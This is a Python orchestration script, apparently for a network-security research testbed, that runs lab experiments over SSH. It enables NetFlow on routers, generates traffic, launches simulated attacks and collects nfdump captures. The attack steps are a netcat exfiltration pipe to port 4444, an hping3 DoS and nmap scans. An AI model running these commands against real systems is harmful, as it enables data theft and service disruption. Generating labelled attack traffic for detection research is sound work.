#!/usr/bin/python
# -*- coding: cp1252 -*-

# Autor: Gabriel Maciá
# Fecha: 23/12/2015


from lib.VeritasExperiment import VeritasExperiment
import time


NOMBRE_EXPERIMENTO = 'prueba'
DIR_RESULTADOS = NOMBRE_EXPERIMENTO + time.strftime('.%y%m%d%H%M')
CD_WORK_DIR = 'cd git/VERITASExperimentalScripts'



######### COMANDOS DE EJECUCIÓN ########################################
# El formato de la lista de comandos es: [tInicio, comando]

def activarNetflowRouters (tInicial):
    ACTIVATE_NETFLOW = CD_WORK_DIR + '/machines/routers/scripts/; sudo ./activateNetflow.sh'
    NFCAPD_CAPTURAS = CD_WORK_DIR + '/machines/routers/capturas; '

    comandos  = [
                        [tInicial, 'ssh nesg@routerR1 "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], #Borra los ficheros antiguos 
                        [tInicial, 'ssh nesg@routerR2 "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], 
                        [tInicial, 'ssh nesg@routerR3 "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], 
                        [tInicial, 'ssh nesg@borderRouter "' + NFCAPD_CAPTURAS + 'rm nfcapd*"'], 
                        [tInicial+1, 'ssh nesg@routerR1 "' + ACTIVATE_NETFLOW + '"'], #Activa NETFLOW
                        [tInicial+1, 'ssh nesg@routerR2 "' + ACTIVATE_NETFLOW + '"'],
                        [tInicial+1, 'ssh nesg@routerR3 "' + ACTIVATE_NETFLOW + '"'],
                        [tInicial+1, 'ssh nesg@borderRouter "' + ACTIVATE_NETFLOW + '"']
                    ]
    return comandos


def tonteria (tInicial):
    comandos = [
                [tInicial, 'ssh nesg@routerR1 "hostname; sleep 30"; echo terminada la siesta de 30s']
                
                ]
    return comandos


def traficoHttp (tInicial, duracion, origen, nClientes):

    TRAFFIC_GENERATOR = CD_WORK_DIR + '/machines/clients/scripts/; ./trafficGenerator.py '
    comandos = [ 
                [tInicial, 'ssh nesg@' + origen + ' "' + TRAFFIC_GENERATOR + ' -n ' + str(nClientes) + 
                 ' -t ' + str(duracion) + ' > tmp.txt"'],
            ]    
    return comandos


def exfiltracion (tInicial, duracion, origen, destino):
    EXFILTRATION = CD_WORK_DIR + '/attacks; ./informationExfiltrated.py '
    comandos = [
                    [tInicial, 'ssh nesg@' + destino +' "nc -l 4444 > tmp.txt"'],
                    [tInicial+2, 'ssh nesg@' + origen + ' "' + EXFILTRATION + '| nc + ' + destino + ' 4444"'],
                    [tInicial+duracion, 'ssh nesg@'+ destino + ' "killall nc"']
                ]
    return comandos


def DoS (tInicial, duracion, speed, origen, destino):
    DOS = CD_WORK_DIR + '/attacks; sudo ./DoSattack.py '
    if (speed != 'fast' and speed != 'faster'):
            speed = 'faster'
    comandos = [
                  [tInicial, 'ssh nesg@' + origen + ' "' + DOS + ' --speed ' + speed + ' ' + destino + ' > tmp.log"'],
                  [tInicial+duracion, 'ssh nesg@' + origen + ' "sudo killall hping3"']
            ]
    return comandos

def nmapAttack (tInicial, duracion, origen, destino, interval):
    NMAP = CD_WORK_DIR + '/attacks; ./nmapGenerator.py '
    comandos = [
                [tInicial, 'ssh nesg@' + origen + ' "' + NMAP + '-i ' + str(interval) + ' -d ' + str(duracion) + ' ' + destino + '>tmp.log"']
            ]
    return comandos

######### COMANDOS DE PROCESADO ########################################
# En estos comandos el tiempo de inicio da igual, ya que se ejecutan secuencialmente uno después del otro. Por esto están todos a 0. 

def desactivarNetflowRouters (): 
    DEACTIVATE_NETFLOW = CD_WORK_DIR + '/machines/routers/scripts/; sudo ./deactivateNetflow.sh'
    comandos = [
                [0, 'ssh nesg@routerR1 "' + DEACTIVATE_NETFLOW + '"'],
                [0, 'ssh nesg@routerR2 "' + DEACTIVATE_NETFLOW + '"'],
                [0, 'ssh nesg@routerR3 "' + DEACTIVATE_NETFLOW + '"'],
                [0, 'ssh nesg@borderRouter "' + DEACTIVATE_NETFLOW + '"'] 
            ]
    return comandos

def copiarFicherosNfcapd ():

    comandos = [
                    [0, 'ssh nesg@routerR1 "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'ssh nesg@routerR2 "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'ssh nesg@routerR3 "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'ssh nesg@borderRouter "' + CD_WORK_DIR + '/machines/routers/scripts; ./renameCaptureFiles.sh"'],    
                    [0, 'mkdir ../resultados/' + DIR_RESULTADOS], #Crea el directorio para almacenar las trazas
                    [0, 'cd ../resultados/' + DIR_RESULTADOS + '; mkdir borderRouter routerR1 routerR2 routerR3'],
                    [0, 'scp nesg@routerR1:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/routerR1'],
                    [0, 'scp nesg@routerR2:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/routerR2'],
                    [0, 'scp nesg@routerR3:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/routerR3'],
                    [0, 'scp nesg@borderRouter:~/git/VERITASExperimentalScripts/machines/routers/capturas/nfcapd* ../resultados/' + DIR_RESULTADOS + '/borderRouter']
                ]
    return comandos

def procesaNfdump ():
    comandos = [
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R borderRouter -q -o csv > borderRouter.csv'],
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R routerR1 -q -o csv > routerR1.csv'],
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R routerR2 -q -o csv > routerR2.csv'],
                 [0, 'cd ../resultados/' + DIR_RESULTADOS +'; nfdump -R routerR3 -q -o csv > routerR3.csv'],
            ]
    return comandos

def plotNfdump ():
    comandos = [
                [0, 'cd ../resultados/' + DIR_RESULTADOS + '; ../../scripts/plot.py *.csv']
            ]
    return comandos

def spoofIPs (ipOrigen, ipsDestino):

    if ipsDestinos != 'private' and ipsDestinos != 'public':
        ipsDestinos == 'public'  # Valor por defecto
    comandos = [
                [0, 'cd ../resultados/' + DIR_RESULTADOS + '; ../../scripts/spoofIP.py --orig_csv routerR1.csv --dest_csv routerR1_spoof.csv -t ' + ipsDestino + ' -s ' + ipOrigen]
            ]
    return comandos
##########################################


if __name__ == '__main__':
    
    
    comandos_ejecucion = (
                          activarNetflowRouters(0) + 
                          #tonteria(3) + 
                          #traficoHttp(5, 1*60, 'm1.2', 50) +  
                          #traficoHttp(2*60, 1*60, 'm2.2', 50) + 
                          #traficoHttp(4*60, 1*60, 'm3.2', 50) 
                          #DoS(3*60, 3*60, 'fast', 'm3.2', '10.0.0.1') +
                          #DoS(10, 30, 'fast', 'm3.2', '10.0.0.1')
                          #exfiltracion(5, 5, 'm3.2', '10.0.0.2')
                          nmapAttack(5, 2*60, 'm2.2', '172.16.0.254', 3)
                          )
                    
    comandos_procesado = (
                          desactivarNetflowRouters() + 
                          copiarFicherosNfcapd() + 
                          procesaNfdump() + 
                          plotNfdump()
                          )
    
    e = VeritasExperiment (NOMBRE_EXPERIMENTO)

    e.insertaListaComandosEjecucion(comandos_ejecucion)
    e.insertaListaComandosProcesado(comandos_procesado)

    e.imprimeComandos()
    e.execute()
